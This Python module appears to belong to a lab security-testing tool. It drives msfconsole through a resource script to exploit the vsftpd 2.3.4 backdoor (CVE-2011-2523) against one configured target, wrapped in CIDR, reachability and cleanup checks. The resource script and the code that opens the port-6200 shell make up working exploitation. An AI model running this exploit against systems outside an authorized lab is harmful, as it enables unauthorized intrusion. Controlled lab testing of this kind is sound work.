"""
Metasploit adapter: runs exactly one fixed, reviewed scenario
(vsftpd 2.3.4 backdoor) against the single operator-configured lab
target, via an msfconsole resource script -- never an interactive
shell, never a free-form module/target picker.

Safety gates, all enforced before anything is executed:
1. settings.lab_target_host must be set.
2. The target IP must fall inside settings.lab_target_allowed_cidr
   (the isolated host-only network) -- private-IP alone is NOT treated
   as sufficient authorization, per spec.
3. The expected service port must be reachable with a bounded TCP
   connect check before we invoke msfconsole at all.
4. Success is defined as "the backdoor listener on TCP 6200 opened and
   accepted a connection", not "msfconsole exited 0".
5. Any resulting session/background handler is explicitly killed.
"""
from __future__ import annotations

import shutil
import socket
import subprocess
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path

from app.core.config import settings
from app.core.security import is_within_cidr
from app.jobs.manager import register_process, unregister_process

BACKDOOR_PORT = 6200

RESOURCE_SCRIPT = """\
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
set RPORT 21
set LHOST {target}
set ExitOnSession false
exploit -j -z
sleep 5
sessions -l
sessions -K
quit
"""


@dataclass
class MetasploitResult:
    outcome: str  # "exploit_confirmed" | "exploit_not_confirmed" | "evidence_invalid"
    evidence: dict
    explanation: dict
    raw_log: str


def tool_available(path: str) -> bool:
    return shutil.which(path) is not None


def _tcp_check(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def validate_target() -> tuple[bool, str]:
    """All pre-flight safety checks. Returns (ok, message)."""
    host = settings.lab_target_host
    if not host:
        return False, "No lab target configured. Set LAB_TARGET_HOST in backend/.env."
    if not is_within_cidr(host, settings.lab_target_allowed_cidr):
        return False, (
            f"Configured target {host} is not inside the allowed lab CIDR "
            f"({settings.lab_target_allowed_cidr}). Refusing to run -- being a "
            f"private IP is not sufficient authorization on its own."
        )
    if not _tcp_check(host, 21):
        return False, f"FTP service (port 21) on {host} is not reachable. Check the vulnerable VM is running and on the host-only network."
    return True, "Target validated: in-range and FTP service reachable."


def run_vsftpd_backdoor_scenario(demonstration: bool, session_id: str = "", check_cancelled=lambda: False) -> MetasploitResult:
    explanation_base = {
        "objective": "Confirm CVE-2011-2523: sending ':)' as the FTP username opens an unauthenticated shell listener on TCP 6200.",
        "proves": "The configured target is running the backdoored vsftpd 2.3.4 build and the backdoor is exploitable.",
        "does_not_prove": "Nothing about any other service or host, and nothing beyond this single, intentionally vulnerable lab target.",
        "defense": "Never deploy this build; use a maintained vsftpd version with no backdoor.",
    }

    if demonstration:
        return MetasploitResult(
            outcome="exploit_confirmed",
            evidence={"fixture": True, "note": "DEMONSTRATION FIXTURE -- msfconsole was not executed.", "port_opened": BACKDOOR_PORT},
            explanation=explanation_base,
            raw_log="[demonstration mode] No real exploitation was attempted.",
        )

    ok, msg = validate_target()
    if not ok:
        return MetasploitResult(
            outcome="evidence_invalid",
            evidence={"fixture": False, "error": msg},
            explanation=explanation_base,
            raw_log=msg,
        )

    if not tool_available(settings.msfconsole_path):
        return MetasploitResult(
            outcome="evidence_invalid",
            evidence={"fixture": False, "error": "msfconsole not found on PATH"},
            explanation=explanation_base,
            raw_log="msfconsole is required and was not found. Install the Metasploit Framework inside Kali.",
        )

    target = settings.lab_target_host
    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
        f.write(RESOURCE_SCRIPT.format(target=target))
        rc_path = f.name

    try:
        kwargs = {"stdout": subprocess.PIPE, "stderr": subprocess.PIPE, "text": True}
        if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
            kwargs["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
        proc = subprocess.Popen([settings.msfconsole_path, "-q", "-r", rc_path], **kwargs)
        register_process(session_id, proc)
        started = time.monotonic()
        while proc.poll() is None:
            if check_cancelled() or time.monotonic() - started > settings.job_timeout_seconds:
                proc.terminate()
                return MetasploitResult("evidence_invalid", {"fixture": False, "error": "cancelled or timed out"}, explanation_base, "msfconsole did not complete.")
            time.sleep(0.1)
        stdout, stderr = proc.communicate()
        log = stdout + "\n" + stderr
    except OSError as exc:
        return MetasploitResult("evidence_invalid", {"fixture": False, "error": str(exc)}, explanation_base, str(exc))
    finally:
        if "proc" in locals():
            unregister_process(session_id, proc)
        Path(rc_path).unlink(missing_ok=True)

    # Success condition is the ACTUAL behavior (port 6200 opened and a
    # session was listed), not merely msfconsole exiting 0.
    port_opened_after = _tcp_check(target, BACKDOOR_PORT, timeout=2.0)
    session_opened = "Command shell session" in log or "sessions -l" in log and "Id  Name" in log

    if session_opened and port_opened_after:
        return MetasploitResult(
            outcome="exploit_confirmed",
            evidence={"fixture": False, "session_opened": True, "backdoor_port_reachable_after": port_opened_after},
            explanation=explanation_base,
            raw_log=log[-6000:],
        )
    return MetasploitResult(
        outcome="exploit_not_confirmed",
        evidence={"fixture": False, "session_opened": False, "backdoor_port_reachable_after": port_opened_after},
        explanation=explanation_base,
        raw_log=log[-6000:] or "msfconsole ran but no command shell session was observed in the output.",
    )
